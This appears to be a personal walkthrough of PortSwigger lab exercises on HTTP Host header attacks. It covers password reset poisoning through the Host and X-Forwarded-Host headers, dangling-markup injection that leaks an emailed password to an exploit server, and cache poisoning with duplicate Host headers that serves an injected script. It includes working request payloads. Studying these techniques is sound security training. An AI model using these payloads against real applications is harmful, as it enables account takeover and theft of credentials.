# Host header attacks

- https://portswigger.net/web-security/host-header
- https://portswigger.net/web-security/host-header/exploiting#how-to-test-for-vulnerabilities-using-the-http-host-header
- https://portswigger.net/web-security/host-header/exploiting

## Basic password reset poisoning

The application uses the `Host` header for forgot-password link with token generation, which is sent to the client.

By trying to reset our password, intercepting the request and changing the `Host` header we can notice, that the the link points to our provided domain.

To solve the lab issue password change request for `carlos`, intercept the request and change `Host` header to the Explot server domain. Then from logs read the password reset token and use it to reset password for `carlos`.

## Password reset poisoning via middleware

This time changing the `Host` header results in 421 response `Invalid host`, so the header must be used for internal redirections or be whitelisted.

Adding `X-Forwarded-Host` headed with our malicious value results in this value being used in generation of reset password link in the email. 

The application uses `Host` value for link generation, but it is also used for internal routing. Not disabled `X-Forwarded-Host` header allowed us to overwrite its value without obstructing the routing.

To solve the lab issue password change request for `carlos`, intercept the request and add `X-Forwarded-Host` header to Explot server domain. Then from logs read the password reset token and use it to reset password for `carlos`.

## Password reset poisoning via dangling markup

This time `Host` header overrites do not work, but apllying the arbitrary port `aaa` to the `Host` header reviels that it is not being used nor validated and is reflected in the received email.

```
Host: 0a5900ae0435584887f31bcc003e00b9.web-security-academy.net:aaa
```

Applying `'"<>{}[]a/\'\"\` as port in order to check for html encoding, which is not present and allows us to inject html.

Since we see in the email that the anti-virus is scanning the email, we can suspect that it will access all the link present in the body.

By issuing the password change request for `carlos` with `Host` header value provided below, we are able to execute successful dangling markup attack and create the the link containg the body email part containing the password. Then we can read the password from the Exploit server Access logs, since the anti virus accessed it automaticaly.

```
Host: 0a5900ae0435584887f31bcc003e00b9.web-security-academy.net:'>ClickMe</a><a href="https://exploit-0a13007704ab58b687331a8701a00079.exploit-server.net?q=
```

Similar attack could be made using `img` tag, that would log for us the password once the victim open the email.

## Web cache poisoning via ambiguous requests

By manipulating `Host` header we can notice that the routing is based upon it, because of the error. By providing two sligtyly diifferent `Host` headers we can conclude, that the first is being parsed by the cache and proxy for routing, and the second one is used by a web page, reflecting its value on it. This discrepancy can potentially be exploited.

```
GET /?cb=123456789123 HTTP/1.1
Host: 0afa00e503d0269681507b9f00b90061.h1-web-security-academy.net
Host: 0afa00e503d0269681507b9f00b90061.xd.net
```

`0afa00e503d0269681507b9f00b90061.xd.net` gets reflected in an absolute url to a script and we see that the response was cached upon performing the second request with only one proper host header.

Now at exploit server create a file at `/resources/js/tracking.js` with response headers and body shown below

```
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
```

```
alert(document.cookie)
```

Then perform the belowe request to cache malicious response and solve the lab. (The solucion can be first tested by issuing two requests, one malicious and one normal, both with the same cache buster `cb` value)

```
GET / HTTP/1.1
Host: 0a13009d033215c58319473f006b0017.h1-web-security-academy.net
Host: exploit-0ad4004f037f154a831e46910160005d.exploit-server.net
```
